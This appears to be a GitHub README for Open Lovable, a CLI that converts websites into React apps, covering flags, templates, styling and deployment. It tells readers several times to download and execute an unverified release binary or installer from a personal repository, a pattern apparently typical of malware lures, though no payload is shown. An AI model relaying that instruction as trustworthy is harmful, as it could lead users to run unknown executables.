[![Releases](https://img.shields.io/github/v/release/Jirapat3008/open-lovable?label=Releases&style=for-the-badge)](https://github.com/Jirapat3008/open-lovable/releases)

Open Lovable — Clone Any Website Into a Modern React App

🔥 Turn a static page into a production-ready React project with one pipeline. Reconstruct HTML, map DOM to JSX, extract styles, and wire up routes. This repo gives a CLI, templates, and build flows to convert a target site into a maintainable React codebase.

Preview image
![React Clone Preview](https://raw.githubusercontent.com/Jirapat3008/open-lovable/main/docs/preview.png)

Table of contents
- About
- Features
- How it works
- Quick start
- Download & run release
- CLI usage
- Project layout
- Integrations
- Deployment
- Tips and best practices
- Contributing
- FAQ
- License
- Acknowledgements

About
Open Lovable automates the steps you would take to reproduce a website as a modern React app. It parses HTML, extracts CSS, and builds component scaffolds in JSX. It supports multiple build targets, routing strategies, and CSS systems. Use it to prototype, rebuild legacy pages, or generate a starter app for UI rewrites.

Features
- HTML to JSX conversion engine that preserves structure and class names.
- CSS extraction and modularization into CSS Modules or Tailwind-friendly output.
- Route mapper that converts site navigation into React Router routes.
- Optional server-side rendering (SSR) and client hydration templates.
- Vite and Webpack starter configs.
- Preset templates: raw-JSX, TypeScript, Next.js, and Gatsby.
- Static asset handling and CDN-ready output.
- Built-in dev server and live reload.
- Plugin system to add custom transformation steps.

How it works
1. Crawl: The tool fetches a target URL and collects HTML, CSS, and linked assets.
2. Parse: It runs an AST transform that converts DOM nodes to JSX nodes.
3. Extract: It pulls out styles, groups selectors, and suggests a CSS strategy.
4. Scaffold: It generates component files, pages, and route definitions.
5. Build: It wires a Vite/Webpack/Next config so you can run the app.

Design goals
- Reproducible output you can edit.
- Clear component boundaries.
- Minimal manual cleanup after generation.
- Support for typical modern React toolchains.

Quick start
1. Prepare a target site URL.
2. Install Node.js 16+ and Git.
3. Download the latest release and run the bundled installer.

Download & run release
Download the release file from https://github.com/Jirapat3008/open-lovable/releases and execute the file for your platform. The release includes a CLI binary and sample templates. After you download the correct artifact, run the included binary or script to install the CLI to your PATH.

If you need the release page again, open https://github.com/Jirapat3008/open-lovable/releases to download the proper file for your operating system. The page lists all builds and checksums.

Installation (manual, Node)
- Install the CLI globally (if you prefer an npm install method):
- `npm install -g open-lovable`
- Or add it as a dev dependency:
- `npm install -D open-lovable`

Run the included installer if you use the release artifact. It will place a binary named `open-lovable` in your PATH on supported OSes. Then run `open-lovable --help`.

CLI usage
- Inspect the available commands: `open-lovable --help`
- Generate a new project from a URL:
- `open-lovable create https://example.com --out my-react-app --template vite`
- Generate with TypeScript:
- `open-lovable create https://example.com --out my-react-app --template vite-ts`
- Run the dev server in the generated project:
- `cd my-react-app`
- `npm install`
- `npm run dev`

Common flags
- `--out <dir>` Target directory for generated project.
- `--template <name>` Template type. Options: `vite`, `vite-ts`, `next`, `gatsby`.
- `--css <strategy>` CSS output. Options: `css-modules`, `tailwind`, `global`.
- `--ssr` Enable server-side rendering in supported templates.
- `--keep-classes` Preserve original class names where possible.
- `--assets` Download linked images and fonts to local assets folder.

Project layout (generated)
- `src/`
  - `components/` Reusable components extracted from the page.
  - `pages/` Route components generated from site navigation.
  - `styles/` Extracted CSS or utility configuration.
  - `assets/` Downloaded images and fonts (optional).
  - `routes.tsx` Route map for React Router or Next.js pages.
- `public/` Static files and manifest.
- `vite.config.ts` or `next.config.js` Build config.
- `package.json` Scripts and dependencies.

Templates and build targets
- Vite (recommended) for fast dev builds and modern bundling.
- Next.js for SSR and hybrid static rendering.
- Gatsby for static site generation and image optimization.

Styling strategies
- CSS Modules: Keeps class scope local to components.
- Tailwind: Generates utility-first class names and config.
- Global CSS: Keeps original stylesheet structure with minimal changes.

Integrations
- React Router v6 for client-side routing.
- SWC or Babel for transpilation, based on template.
- PostCSS and Autoprefixer for cross-browser CSS.
- Optional image optimization via imagemin or Next Image.

How to edit generated output
- Open a component in `src/components/`.
- Remove placeholder props and add typed interfaces if you use TypeScript.
- Replace inline script logic with proper event handlers and state hooks.
- Move shared layout pieces into `src/components/Layout.tsx`.
- If SSR is enabled, keep data-fetching in the page-level async functions.

Deployment
- Static export: `npm run build && npm run export` for static templates.
- Vercel: Push a Next.js template; Vercel will detect and deploy.
- Netlify: Use Vite or Gatsby build commands in the Netlify UI.
- Docker: Use the `Dockerfile` included in some templates to build a container image.

Best practices and tips
- Audit class names. The tool preserves names but you should rename and scope them.
- Convert inline scripts to module code. The generator extracts scripts but not complex logic.
- Replace direct DOM manipulation with React refs or state.
- Profile the generated app with the React DevTools and Lighthouse.
- Use code formatters and linters: `eslint`, `prettier`, `stylelint`.

Advanced workflow (example)
1. `open-lovable create https://example.com --out demo-app --template vite-ts --css css-modules`
2. `cd demo-app`
3. `pnpm install`
4. `pnpm dev`
5. Open `http://localhost:5173` and inspect components.
6. Refine `src/styles/` and run `pnpm build` for production.

Plugin system
- Add custom transformations by writing a plugin file that implements the `transform` hook.
- Plugins get AST nodes for HTML and CSS and return modified JSX and styles.

Extending the output
- Add TypeScript types: create `types/` and export prop interfaces from components.
- Add unit tests: install `vitest` or `jest` and add tests for important components.
- Add storybook: scaffold `.storybook` and mount components for visual testing.

Security
- Check downloaded assets for license and origin.
- Audit dependencies in `package.json` with `npm audit` or `pnpm audit`.
- Remove inline third-party scripts that inject external logic.

Contributing
- Fork the repo and open a branch for feature work.
- Follow the code style: run `npm run format` before you open a PR.
- Add tests for core features: HTML to JSX mapping, CSS extraction, and route generation.
- Open an issue if you find a bug or want a new template.

FAQ
Q: Which sites can I convert?
A: Static and server-rendered HTML pages work best. Sites that require heavy runtime authentication or dynamic API-driven UI need manual work after generation.

Q: Do I need any special permissions to clone a site?
A: Respect copyright and licensing. Use Open Lovable for learning, prototyping, or sites you own.

Q: Will the tool generate server-side logic?
A: No. The tool focuses on UI and static structure. You must rewrite or re-implement server logic and APIs.

Q: Can I add custom CSS mapping rules?
A: Yes. Add a CSS transform plugin to the `plugins/` folder and register it in the config.

Troubleshooting
- If class names look broken, try `--keep-classes` when you run create.
- If images fail to download, check remote CORS and asset URLs.
- If a route is missing, run the generator with `--verbose` to inspect the navigation map.

Release artifacts
Download the release file from https://github.com/Jirapat3008/open-lovable/releases and run the contained binary or installer for your OS. The releases page holds platform builds, checksums, and changelogs. Use the release that matches your environment.

Changelog highlights
- v1.2.0: Add Tailwind output, Vite TypeScript template, improved CSS grouping.
- v1.1.0: Introduced SSR template and route mapper improvements.
- v1.0.0: CLI and core HTML to JSX engine release.

License
This project uses the MIT license. See the LICENSE file for details.

Acknowledgements
- React team for the component model and patterns.
- Vite and Next.js communities for build and SSR lessons.
- Open source parsing libraries for AST utilities.

Contact
Open issues and pull requests at the repository. For release downloads and artifacts visit the releases page: https://github.com/Jirapat3008/open-lovable/releases

Community
Join discussions, share templates, or contribute plugins by opening issues and pull requests. The repo stays open for collaboration and for building useful templates for common site patterns.